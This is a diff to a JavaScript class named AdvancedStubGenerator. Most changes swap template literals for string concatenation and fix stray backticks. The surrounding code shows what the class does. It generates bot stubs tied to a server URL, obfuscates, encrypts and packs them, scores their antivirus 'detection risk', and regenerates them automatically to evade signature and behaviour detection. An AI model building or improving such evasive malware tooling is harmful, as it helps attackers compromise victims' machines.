@@ -21,7 +21,7 @@ class AdvancedStubGenerator {
             const end = process.hrtime.bigint();
             const duration = Number(end - start) / 1000000; // Convert to milliseconds
             if (duration > 100) { // Log slow operations
-                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+                console.warn('[PERF] Slow operation: ' + duration.toFixed(2) + 'ms');
             }
             return result;
         }
@@ -464,7 +464,7 @@ class AdvancedStubGenerator {
                 obfuscationLevel
             });
 
-            logger.info(`Successfully generated ${template.name} stub with ID: botId`);
+            logger.info('Successfully generated ' + template.name + ' stub with ID: ' + botId);
             return {
                 success: true,
                 botId,
@@ -519,7 +519,7 @@ class AdvancedStubGenerator {
                 stubCode = this.generateJavaScriptStub(template, platform, serverUrl, botId);
                 break;
             default:
-                throw new Error(`Unsupported language: ${language}`);
+                throw new Error('Unsupported language: ' + language);
         }
 
         return stubCode;
@@ -1790,7 +1790,7 @@ stub.start();
             });
         }
         
-        logger.info(`Stats updated: ${action}`, details);
+        logger.info('Stats updated: ' + action, details);
     }
 
     async regenerateStub(botId, newOptions = {}) {
@@ -1815,7 +1815,7 @@ stub.start();
             if (result.success) {
                 this.regenerationCount++;
                 this.stats.regenerationCount++;
-                logger.info(`Successfully regenerated stub ${botId}`);
+                logger.info('Successfully regenerated stub ' + botId);
             }
 
             return result;
@@ -1851,7 +1851,7 @@ stub.start();
             const deleted = this.activeStubs.delete(botId);
             if (deleted) {
                 this.stats.activeStubs = this.activeStubs.size;
-                logger.info(`Deleted stub ${botId}`);
+                logger.info('Deleted stub ' + botId);
                 return { success: true };
             } else {
                 return { success: false, error: 'Stub not found' };
@@ -1911,10 +1911,10 @@ stub.start();
                 const detectionScore = await this.analyzeDetectionRisk(stub);
                 
                 if (detectionScore > this.detectionThresholds.signatureDetection) {
-                    logger.warn(`High detection risk for stub ${botId}: detectionScore`);
+                    logger.warn('High detection risk for stub ' + botId + ': ' + detectionScore);
                     await this.triggerAutoRegeneration(botId, 'signature_detection');
                 } else if (detectionScore > this.detectionThresholds.behaviorAnalysis) {
-                    logger.warn(`Medium detection risk for stub ${botId}: detectionScore`);
+                    logger.warn('Medium detection risk for stub ' + botId + ': ' + detectionScore);
                     await this.scheduleRegeneration(botId, 'behavior_analysis');
                 }
             }
@@ -1990,7 +1990,7 @@ stub.start();
 
     async triggerAutoRegeneration(botId, reason) {
         try {
-            logger.info(`Triggering auto-regeneration for ${botId} due to: reason`);
+            logger.info('Triggering auto-regeneration for ' + botId + ' due to: ' + reason);
             
             const newOptions = {
                 encryptionMethods: this.generateRandomEncryptionMethods(),
@@ -2004,7 +2004,7 @@ stub.start();
             
             if (result.success) {
                 this.stats.autoRegenerations = (this.stats.autoRegenerations || 0) + 1;
-                logger.info(`Auto-regeneration successful for ${botId}`);
+                logger.info('Auto-regeneration successful for ' + botId);
             }
 
             return result;
@@ -2023,7 +2023,7 @@ stub.start();
             status: 'scheduled'
         });
 
-        logger.info(`Scheduled regeneration for ${botId} at scheduleTime.toISOString()`);
+        logger.info('Scheduled regeneration for ' + botId + ' at ' + scheduleTime.toISOString());
     }
 
     generateRandomEncryptionMethods() {
@@ -2051,10 +2051,10 @@ stub.start();
                 const health = await this.checkStubHealth(stub);
                 
                 if (health.status === 'critical') {
-                    logger.warn(`Critical health for stub ${botId}: health.reason`);
+                    logger.warn('Critical health for stub ' + botId + ': ' + health.reason);
                     await this.triggerAutoRegeneration(botId, 'health_critical');
                 } else if (health.status === 'warning') {
-                    logger.warn(`Warning health for stub ${botId}: health.reason`);
+                    logger.warn('Warning health for stub ' + botId + ': ' + health.reason);
                     await this.scheduleRegeneration(botId, 'health_warning');
                 }
             }
@@ -2074,9 +2074,9 @@ stub.start();
         const issues = Object.entries(healthFactors).filter(([_, status]) => status !== 'good');
         
         if (issues.length >= 2) {
-            return { status: 'critical', reason: `Multiple issues: ${issues.map(([factor]) => factor).join(', ')}` };
+            return { status: 'critical', reason: 'Multiple issues: ' + issues.map(([factor]) => factor).join(', ') };
         } else if (issues.length === 1) {
-            return { status: 'warning', reason: `Issue detected: ${issues[0][0]}` };
+            return { status: 'warning', reason: 'Issue detected: ' + issues[0][0] };
         } else {
             return { status: 'healthy', reason: 'All systems operational' };
         }
@@ -2160,7 +2160,7 @@ stub.start();
 
             const unpackMethod = this.unpackMethods[packingMethod];
             if (!unpackMethod) {
-                throw new Error(`Unsupported packing method: ${packingMethod}`);
+                throw new Error('Unsupported packing method: ' + packingMethod);
             }
 
             const unpackedData = await unpackMethod(stubData, options);
@@ -2174,7 +2174,7 @@ stub.start();
                 size: unpackedData.length
             });
 
-            logger.info(`Successfully unpacked stub: ${unpackId}`);
+            logger.info('Successfully unpacked stub: ' + unpackId);
             return {
                 success: true,
                 unpackId: unpackId,
@@ -2199,11 +2199,11 @@ stub.start();
                 throw new Error("Unpacked stub " + unpackId + " not found");
             }
 
-            logger.info(`Repacking stub ${unpackId} with newPackingMethod`);
+            logger.info('Repacking stub ' + unpackId + ' with ' + newPackingMethod);
 
             // Apply new encryption methods
             let repackedData = unpackedStub.unpackedData;
-            if (newEncryptionMethods.length >` 0) {
+            if (newEncryptionMethods.length > 0) {
                 repackedData = await this.applyAllEncryptionLayers(repackedData, newEncryptionMethods);
             }
 
@@ -2224,7 +2224,7 @@ stub.start();
                 size: repackedData.length
             });
 
-            logger.info(`Successfully repacked stub: ${repackId}`);
+            logger.info('Successfully repacked stub: ' + repackId);
             return {
                 success: true,
                 repackId: repackId,
@@ -2384,7 +2384,7 @@ stub.start();
         try {
             const deleted = this.unpackedStubs.delete(unpackId);
             if (deleted) {
-                logger.info(`Deleted unpacked stub: ${unpackId}`);
+                logger.info('Deleted unpacked stub: ' + unpackId);
                 return { success: true };
             } else {
                 return { success: false, error: 'Unpacked stub not found' };
@@ -2761,18 +2761,18 @@ stub.start();
         const hours = Math.floor(minutes / 60);
         const days = Math.floor(hours / 24);
         
-        if (days > 0) return `${days}d ${hours % 24}h ${minutes % 60}m`;
-        if (hours > 0) return `${hours}h ${minutes % 60}m`;
-        if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
-        return `${seconds}s`;
+        if (days > 0) return days + 'd ' + (hours % 24) + 'h ' + (minutes % 60) + 'm';
+        if (hours > 0) return hours + 'h ' + (minutes % 60) + 'm';
+        if (minutes > 0) return minutes + 'm ' + (seconds % 60) + 's';
+        return seconds + 's';
     }
 
     formatMemory(memoryUsage) {
         return {
-            rss: `${Math.round(memoryUsage.rss / 1024 / 1024)} MB`,
-            heapTotal: `${Math.round(memoryUsage.heapTotal / 1024 / 1024)} MB`,
-            heapUsed: `${Math.round(memoryUsage.heapUsed / 1024 / 1024)} MB`,
-            external: `${Math.round(memoryUsage.external / 1024 / 1024)} MB`
+            rss: Math.round(memoryUsage.rss / 1024 / 1024) + ' MB',
+            heapTotal: Math.round(memoryUsage.heapTotal / 1024 / 1024) + ' MB',
+            heapUsed: Math.round(memoryUsage.heapUsed / 1024 / 1024) + ' MB',
+            external: Math.round(memoryUsage.external / 1024 / 1024) + ' MB'
         };
     }
 
@@ -2911,7 +2911,7 @@ stub.start();
             const ageInHours = (now - generatedAt) / (1000 * 60 * 60);
             
             // Performance degrades with age
-            if (ageInHours >` 168) return 'degraded'; // 1 week
+            if (ageInHours > 168) return 'degraded'; // 1 week
             if (ageInHours > 72) return 'good'; // 3 days
             return 'good';
         } catch (error) {
@@ -2933,4 +2933,4 @@ stub.start();
     }
 }
 
-module.exports = AdvancedStubGenerator;
+module.exports = AdvancedStubGenerator
